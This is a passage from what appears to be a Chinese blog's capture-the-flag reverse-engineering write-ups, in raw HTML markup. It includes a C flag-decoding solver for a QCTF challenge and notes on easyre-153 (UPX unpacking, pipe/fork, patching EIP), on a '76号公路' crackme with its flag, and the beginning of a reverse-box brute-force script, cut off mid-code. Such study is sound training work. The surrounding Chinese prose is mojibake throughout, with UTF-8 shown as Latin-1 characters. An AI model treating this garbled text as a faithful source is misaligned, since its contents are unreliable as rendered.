class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida[<span class="number">152</span>];</span><br><span class="line"><span class="keyword">int</span> change[<span class="number">38</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">   <span class="number">22</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">6</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">24</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">21</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">18</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">10</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">12</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">17</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">23</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">13</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">14</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">19</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">11</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">20</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">16</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">25</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">36</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">27</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">28</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">29</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">37</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">31</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">33</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">26</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">34</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, temp = <span class="number">0</span>, lenth = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, c[<span class="number">2000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> count[<span class="number">127</span>] = &#123;<span class="number">0</span>&#125;, change_[<span class="number">38</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">fp = fopen(<span class="string">"out"</span>, <span class="string">"rb"</span>);      <span class="comment">//å…ˆä»æ–‡ä»¶è¯»å–å¯†æ–‡  </span></span><br><span class="line">lenth = fread(b, <span class="number">1</span>, <span class="number">100</span>, fp); <span class="comment">//è¿”å›è¯»å–æˆåŠŸä¸ªæ•°, ç¡®å®šå­—ç¬¦ä¸ªæ•°</span></span><br><span class="line">fclose(fp);</span><br><span class="line">    </span><br><span class="line">temp = b[lenth<span class="number">-1</span>]&amp;<span class="number">7</span>; <span class="comment">//&amp;7  å–åä¸‰ä½æ•°æ®.</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = (b[i] &gt;&gt; <span class="number">3</span>) | (temp &lt;&lt; <span class="number">5</span>);</span><br><span class="line">temp = b[i]&amp;<span class="number">7</span>;<span class="comment">//ä»æ•´ä½“æ¥çœ‹å°±æ˜¯å°†æ•´ä¸ªæ•°æ®å³ç§»åŠ¨3ä½</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">fp = fopen(<span class="string">"that_girl"</span>, <span class="string">"rb"</span>); <span class="comment">//æ‰“å¼€that_girl, ç»Ÿè®¡å­—ç¬¦æ•°.</span></span><br><span class="line">fread(c, <span class="number">1</span>, <span class="number">1742</span>, fp);</span><br><span class="line">fclose(fp); </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(c); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(c[i] &gt;= <span class="number">65</span> &amp;&amp; c[i] &lt;= <span class="number">90</span>)  </span><br><span class="line">c[i] += <span class="number">32</span>;<span class="comment">//å› ä¸ºä¸åŒºåˆ†å¤§å°å†™, éƒ½è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line"></span><br><span class="line">count[c[i]]++; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(A.change[i]) </span><br><span class="line">&#123;</span><br><span class="line">change_[j++] = A.change[i];  <span class="comment">//ç»Ÿè®¡æ¯ä¸ªå­—ç¬¦å‡ºç°æ¬¡æ•°</span></span><br><span class="line">i = A.change[i];  </span><br><span class="line">&#125;</span><br><span class="line">j -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">temp = a[<span class="number">0</span>], a[<span class="number">0</span>] = a[change_[j]];  <span class="comment">//ç¬¬äºŒå±‚è§£å¯†</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth<span class="number">-2</span>; i++) <span class="comment">//æŒ‰ç…§ç»™å®šèµ‹å€¼æ‰¾åˆ°ä¸€ä¸ªæœªå˜çš„å€¼, å€’åºèµ‹å€¼å›å»å³å¯</span></span><br><span class="line">&#123;</span><br><span class="line">a[change_[j]] = a[change_[--j]];</span><br><span class="line">&#125;</span><br><span class="line">a[change_[j]] = temp; </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i++)<span class="comment">//ç¬¬ä¸‰å±‚è§£å¯†,æ¯”å¯¹æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°çš„é¡ºåº,è¿›è€Œç¡®å®šè¾“å…¥é¡ºåº</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] == count[j])</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = j; </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"QCTF&#123;%s&#125;"</span>, flag); <span class="comment">//å¾—åˆ°flag.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515135919513-1591166487828.png" alt="image-20200515135919513"></p></li><li><p><strong>æ€»ç»“: (1ï¼‰ç®—æ³•å¥½çš„è¯, è¿™é“é¢˜å°±è½»æ¾å¾ˆå¤šã€‚(2)æ³¨æ„64ä½ç¨‹åºçš„ä¼ é€’å‚æ•°çš„æ–¹å¼ã€‚(3)è¦ä¹ æƒ¯çœ‹æ±‡ç¼–ä»£ç ã€‚</strong></p></li></ul><hr><h2 id="easyre-153"><a href="#easyre-153" class="headerlink" title="easyre-153"></a>easyre-153</h2><blockquote><p>é¢˜å…¶å®å¾ˆç®€å•,  ä½†å·®ç‚¹åšåˆ°è‡ªé—­â€¦ å…¶å®èƒ½çŒœåˆ°flagæ€ä¹ˆç®—å‡ºæ¥, ä½†å¯¹ç¨‹åºçš„æ‰§è¡Œæƒ³ä¸æ˜ç™½.</p></blockquote><ul><li><p>32ä½elfæ–‡ä»¶åŠ äº†upxå£³, æ²¡æœ‰ä¿®æ”¹è¿‡çš„, ç›´æ¥upx -dè„±å£³æˆåŠŸ.<img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515184107394-1591167002031.png" alt="image-20200515184107394"></p></li><li><p>idaæ‰“å¼€, æ‰¾åˆ°ä¸»å‡½æ•°. ä¸€å¼€å§‹å°±è®¤ä¸ºç›´æ¥åŠ¨è·³æ§åˆ¶å‡½æ•°çš„èµ°å‘, åˆ°æœ€åä¸€ä¸ª <strong>lol</strong> å‡½æ•°å¾—åˆ°flag. ä½†æ˜¯åŠ¨æ€æ€»æ˜¯åœ¨readå‡½æ•°å¡ä½, èµ°ä¸äº†, ä½†è¿™é‡Œæˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥è·³,å› ä¸ºè¿™ä¸ªå‡½æ•°æ˜¯å‘<strong>buf</strong>å†™å†…å®¹, æˆ‘ä»¬æœ€åçš„flagæ˜¯è¦ä½¿ç”¨bufçš„å†…å®¹. ç„¶ååˆè½¬ GDB è°ƒè¯•, åŒç„¶çš„ç»“æœ.    çº³é—·è¿™é¢˜äº†, å®ƒåˆ°åº•æ˜¯è¦åšä»€ä¹ˆ. å…¶å®çŒœä¹Ÿæ˜¯æŠŠä¸Šé¢ writeçš„é‚£éƒ¨åˆ†æ•°æ®ä½œä¸º buf çš„å†…å®¹, ç„¶ååœ¨lolå‡½æ•°å¾—åˆ° flag.  ä½†é—®é¢˜æ˜¯ ç¨‹åºåˆ°åº•åœ¨æä»€ä¹ˆâ€¦..</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515185409497-1591167023660.png" alt="image-20200515185409497"></p></li><li><p>çœŸçš„åšåˆ°è‡ªé—­, åæ¥æ‰å‘ç°æˆ‘å¿½ç•¥ä¸Šé¢çš„ pipe()å‡½æ•°ä¸fork()å‡½æ•°. ç¬¬ä¸€æ¬¡è§åˆ°, ç™¾åº¦äº†ä¸‹, æ˜ç™½äº†â€¦â€¦.</p><blockquote><p>é¦–å…ˆæ˜¯ç®¡é“: 1.å…¶æœ¬è´¨æ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶(å®ä¸ºå†…æ ¸ç¼“å†²åŒº)</p><p>â€‹                     2.ç”±ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦å¼•ç”¨ï¼Œä¸€ä¸ªè¡¨ç¤ºè¯»ç«¯ï¼Œä¸€ä¸ªè¡¨ç¤ºå†™ç«¯ã€‚</p><p>â€‹                     3.è§„å®šæ•°æ®ä»ç®¡é“çš„å†™ç«¯æµå…¥ç®¡é“ï¼Œä»è¯»ç«¯æµå‡º</p><p>pipe()å‡½æ•°ç”¨äºåˆ›å»ºç®¡é“: 1.int pipe(int pipefd[2]); æˆåŠŸï¼š0ï¼›å¤±è´¥ï¼š-1ï¼Œè®¾ç½®errno</p><p>â€‹                                           2.å‡½æ•°è°ƒç”¨æˆåŠŸè¿”å›r/wä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚æ— éœ€openï¼Œä½†éœ€æ‰‹åŠ¨close</p><p>â€‹                                           3.è§„å®šï¼šfd[0] â†’ rï¼› fd[1] â†’ wï¼Œå°±åƒ0å¯¹åº”æ ‡å‡†è¾“å…¥ï¼Œ1å¯¹åº”æ ‡å‡†è¾“å‡ºä¸€æ ·ã€‚</p><p>â€‹                                           4.å‘ç®¡é“æ–‡ä»¶è¯»å†™æ•°æ®å…¶å®æ˜¯åœ¨è¯»å†™å†…æ ¸ç¼“å†²åŒº</p><p><strong>è¿™é‡Œå°±æ˜¯é€šè¿‡pipedes[1]å†™è¿›å†…å®¹,  ä»pipedes[0]å†™å‡º.</strong>                    </p></blockquote><blockquote><p>ç„¶åfork()å‡½æ•°. 1.forkï¼ˆï¼‰å‡½æ•°é€šè¿‡ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ªä¸åŸæ¥è¿›ç¨‹å‡ ä¹å®Œå…¨ç›¸åŒçš„è¿›ç¨‹ï¼Œ</p><p>â€‹                            ä¹Ÿå°±æ˜¯ä¸¤ä¸ªè¿›ç¨‹å¯ä»¥åšå®Œå…¨ç›¸åŒçš„äº‹ï¼Œä½†å¦‚æœåˆå§‹å‚æ•°æˆ–è€…ä¼ å…¥çš„å˜é‡ä¸åŒï¼Œä¸¤ä¸ªè¿›ç¨‹                            ä¹Ÿå¯ä»¥åšä¸åŒçš„äº‹</p><p>â€‹                           2.ä¸€ä¸ªè¿›ç¨‹è°ƒç”¨forkï¼ˆï¼‰å‡½æ•°åï¼Œç³»ç»Ÿå…ˆç»™æ–°çš„è¿›ç¨‹åˆ†é…èµ„æºï¼Œä¾‹å¦‚å­˜å‚¨æ•°æ®å’Œä»£ç çš„ç©º                           é—´ã€‚ç„¶åæŠŠåŸæ¥çš„è¿›ç¨‹çš„æ‰€æœ‰å€¼éƒ½å¤åˆ¶åˆ°æ–°çš„æ–°è¿›ç¨‹ä¸­ï¼Œåªæœ‰å°‘æ•°å€¼ä¸åŸæ¥çš„è¿›ç¨‹å€¼                           ä¸åŒã€‚ç›¸å½“äºå…‹éš†äº†ä¸€ä¸ªè‡ªå·±</p><p>â€‹                           3.è°ƒç”¨forkå‡½æ•°ä¸€æ¬¡, è¿”å›2æ¬¡å€¼, è‹¥è¿”å›0åˆ™æ˜¯å­è¿›ç¨‹, è‹¥æ˜¯ä¸€ä¸ªæ•°åˆ™æ˜¯çˆ¶è¿›ç¨‹çš„è¿›ç¨‹å·.</p><p><strong>æ‰€ä»¥è¿™é‡Œå°±æ˜¯å…ˆåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹,è¿”å›å€¼v5 == 0, è¿›å…¥å­è¿›ç¨‹å®Œæˆå†™å…¥æ•°æ®åç»“æŸè¿›ç¨‹, fork()è¿”å›æ–°çš„å€¼çˆ¶è¿›ç¨‹è¿›ç¨‹å·,ç„¶åæ‰§è¡Œåé¢çš„æ“ä½œ.</strong>        </p></blockquote></li><li><p>è¿™é‡ŒåŠ¨æ€è°ƒè¯•è¿™ç§åˆ›å»ºè¿›ç¨‹çš„ç¨‹åºæ˜¯ä¸é€šç•…çš„. é‚£å°±é€šè¿‡ä¿®æ”¹ç¨‹åº EIP, æŒ‰ç…§æœ¬æ¥è¦æ‰§è¡Œçš„é¡ºåºæ‰§è¡Œä¸€éå¾—åˆ°flag.(æ³¨æ„è¿™æ ·å¯èƒ½ä¼šæœ‰ä¸€ä¸ªé—®é¢˜: æ ˆä¸å¹³è¡¡, å› ä¸ºå‡½æ•°æ²¡æœ‰æ­£å¸¸è¿”å›, é‚£ä¼šå½±å“ä¸€äº›å‡½æ•°, æ¯”å¦‚scanf()å‡½æ•°æ‰§è¡Œåˆ°äº†, ä¸ä¼šè®©æˆ‘ä»¬è¾“å…¥, è€Œæ˜¯ç›´æ¥è·³è¿‡, è¿™å°±æ˜¯å †æ ˆæœ‰å€¼å®ƒå°±ç›´æ¥è¯»å–äº†)</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515193103677-1591167041257.png" alt="image-20200515193103677"></p></li><li><p><strong>æ€»ç»“:(1)å¯¹äºç›²åŒºçš„çŸ¥è¯†, æèµ·æ¥è¿˜æ˜¯éº»çƒ¦, ç§¯ç´¯. (2)ç†Ÿæ‚‰äº†ä¿®æ”¹ EIP.</strong> </p></li></ul><hr><h2 id="76å·å…¬è·¯"><a href="#76å·å…¬è·¯" class="headerlink" title="76å·å…¬è·¯"></a>76å·å…¬è·¯</h2><ul><li>é¢˜ç›®çœ‹ä¼¼å¾ˆéš¾çš„æ ·å­, ä½†è‡ªå·±ç¡®å®è¢«é¢˜ç›®çš„ä¿¡æ¯è¯¯å¯¼äº†.</li><li>ä¸‹è½½å, 2ä¸ªæ–‡æœ¬ä¸€ä¸ª32ä½æ— å£³elfæ–‡ä»¶, å¹¶ä¸”é¢˜ç›®ä¿¡æ¯å°±ç»™äº† <strong>æˆ‘ä»¬è®¤ä¸ºæœ‰ä»½ç¡®åˆ‡çš„æ–‡æ¡£è®°å½•äº†æ¯ä¸ªåŒºåŸŸçš„åŠŸèƒ½ï¼Œè¯·ååŠ©æ‰¾å‡º</strong> è¿™ä¸ªæç¤º, æ‰€ä»¥è‡ªå·±åšé¢˜æ—¶å§‹ç»ˆæƒ³åˆ°æ€ä¹ˆå’Œæ–‡æœ¬è”ç³»èµ·æ¥, æ‰¾çº¿ç´¢. ä½†å…¶å®ä¸ç„¶</li><li>è½½å…¥idaå, æœç´¢äº†ä¸‹å­—ç¬¦ä¸², æ‰¾åˆ°äº†ä¸»å‡½æ•°, ä½†æ˜¯ä¸èƒ½è½¬åŒ–ä¸ºä¼ªä»£ç ,  å› ä¸ºä¹‹å‰äº†è§£è¿‡ç‚¹èŠ±æŒ‡ä»¤,å…¶ä¸­  <strong>E0</strong> æ€»æ˜¯å¹²æ‰°ä»£ç çš„. æ”¹ä¸º <strong>90</strong> nopæ‰å°±å¯ä»¥äº†. </li><li>è¿™é‡ŒåŒæ ·. æ”¹å®Œå, å¼€å§‹è¯»æ±‡ç¼–ä»£ç , é€»è¾‘å¾ˆç®€å•, å°±æ˜¯æç¤º, è®©æˆ‘ä»¬è¾“å…¥å­—ç¬¦, è¿›å»ä¸€ä¸ªå‡½æ•°åˆ¤æ–­.<img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200521123259003-1591167068213.png" alt="image-20200521123259003"></li><li>è¿›å»åˆ¤æ–­å‡½æ•°, å¯ä»¥æŸ¥çœ‹ä¼ªä»£ç çš„. åˆ†æä¸€ä¸‹å°±çŸ¥é“æ˜¯è·Ÿç€ä¸€æ¡çº¿æŒ‰ç…§é¡ºåºæ£€ç´¢æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸². ä½†æ˜¯æ€ä¹ˆæ‰¾é¡ºåºå‘¢, å› ä¸ºæ–‡æœ¬æ–‡ä»¶è¿˜æ²¡ç”¨, æˆ‘å°±å§‹ç»ˆè®¤ä¸ºåœ¨æ–‡æœ¬æ–‡ä»¶æ‰¾, æ‰¾äº†åŠå¤©â€¦â€¦.æ— æœ</li><li>æœ€åå›åˆ°ç¨‹åºå‘ç°, å¯ä»¥æ‰¾åˆ°å…¥å£ç‚¹, é¡ºè—¤æ‘¸ç“œçš„å°±å¯ä»¥æ‰¾åˆ°äº†å•Š. å¯ä»¥çŸ¥é“ä»ç´¢å¼• <strong>v2</strong> ä»0å¼€å§‹, ç›´æ¥ä»è¿™é‡Œå‡ºå‘å°±å¥½äº†. ç›´åˆ°æ­£ç¡®é€€å‡ºå¾ªç¯.<img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200521123808376-1591167075180.png" alt="image-20200521123808376"></li><li>æœ€åå¾—åˆ°flag: <strong>flag{09vdf7wefijbk}</strong>.</li><li><strong>æ€»ç»“: (1)ä¸è¦è®©é¢˜ç›®æŠŠè‡ªå·±çš„æ€è·¯å¸¦åäº†, æ€ç»´è¦å‘æ•£ä¸€äº›.</strong>  </li></ul><hr><h2 id="reverse-box"><a href="#reverse-box" class="headerlink" title="reverse-box"></a>reverse-box</h2><ul><li><p>é¢˜ç›®ä¸‹è½½ä¸‹æ¥ï¼Œå¼„åŠå¤©å§‹ç»ˆè§‰å¾—æœ‰é—®é¢˜ã€‚ç™¾åº¦å‘ç°é¢˜ç›®å°‘ç»™äº†è¾“å‡ºå­—ç¬¦ä¸²ã€‚</p></li><li><p>å¼€å§‹å†æ¬¡çœ‹é¢˜ï¼Œè¢«è‡ªå·±å‘æƒ¨äº†ã€‚ã€‚ã€‚å› ä¸ºç”Ÿæˆæ•°æ®è¡¨çš„å‡½æ•°ä¸­è‡ªå·±åªçœ‹åˆ°äº†ç”Ÿæˆçš„éšæœºæ•°èµ‹å€¼äº†ç»™äº†æ•°æ®è¡¨çš„ç¬¬ä¸€æ¬¡å…ƒç´ ï¼Œé‚£æ•´ä¸ªé¢˜å°±æœ‰ç‚¹å¥‡æ€ªäº†ã€‚çœ‹äº†åˆçœ‹ï¼Œæ‰å‘å…ˆæœ€åç”¨åˆ°äº†éšæœºæ•°ç”Ÿæˆæ•°æ®çš„ï¼Œåªæ˜¯å±å¹•å®¹ä¸ä¸‹äº†ã€‚ã€‚ã€‚</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200528115958609-1591167079725.png" alt="image-20200528115958609"></p></li><li><p>å¦å¤–å°±æ˜¯å…ˆå°†æ¯æ¬¡ç”Ÿæˆç´¢å¼•å€¼ v7 ç”¨Cè¯­è¨€å†™å‡ºæ¥åæ‰“å°çœ‹çœ‹ï¼Œ ä½†å¤§å¤šæ•°æ˜¯è´Ÿæ•°ï¼Œå¾ˆå¤§çš„æ•°ã€‚è¿™æ˜¾ç„¶ä¸å¯¹çš„ï¼Œå› ä¸ºæˆ‘ä»¬è¿è¡Œç¨‹åºæ—¶è¾“å…¥çš„å‚æ•°éƒ½æ˜¯å¯æ‰“å°å­—ç¬¦ ï¼ˆASCII: 32-127ï¼‰ï¼Œä¼ªä»£ç ä¸é è°±ï¼Œæœæ–­å»çœ‹çœ‹äº†æ±‡ç¼–ã€‚</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200528121109201-1591167091052.png" alt="image-20200528121109201"></p></li><li><p>å¦å¤–å°±æ˜¯ ä¼ªä»£ç ä¸­çš„ __ROR__äº†ï¼Œçœ‹äº†æ±‡ç¼–çŸ¥é“äº† ror æŒ‡ä»¤ï¼Œå°†æ•°æ®æƒ³å³ä½ç§»åŠ¨æŒ‡å®šçš„ä½æ•°ã€‚ä»¥ä¸ºåªæ˜¯ç®€å•çš„  &gt;&gt; ï¼Œå°±è¿™æ ·å†™äº†æ•´ä¸ªé¢˜çš„çˆ†ç ´ä»£ç ã€‚ä½†æ˜¯å§‹ç»ˆä¸å¯¹ï¼ŒèŠ±äº†å¾ˆæ—¶é—´ï¼Œä¸ç”˜å¿ƒï¼Œå°±idaä¸­åŠ¨è°ƒï¼ŒCè¯­è¨€ä¸­è°ƒè¯•ï¼Œæ¯ä¸ªæ­¥éª¤å¯¹æ¯”ç»“æœï¼Œæ‰æ‰¾åˆ°æ˜¯ ror è¿™é‡Œé”™äº†ã€‚ã€‚ã€‚ åŸæ¥ ror æ˜¯å³ç§»åŠ¨ä½åä¼šæŠŠå¤šä½™çš„ä½ç§»åŠ¨åˆ°æœ€å·¦è¾¹ï¼Œå³ä¸€ä¸ªåœ†åœˆè½¬ã€‚</p></li><li><p>exp: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">generate</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> *result)</span></span></span><br><span class="line"><span 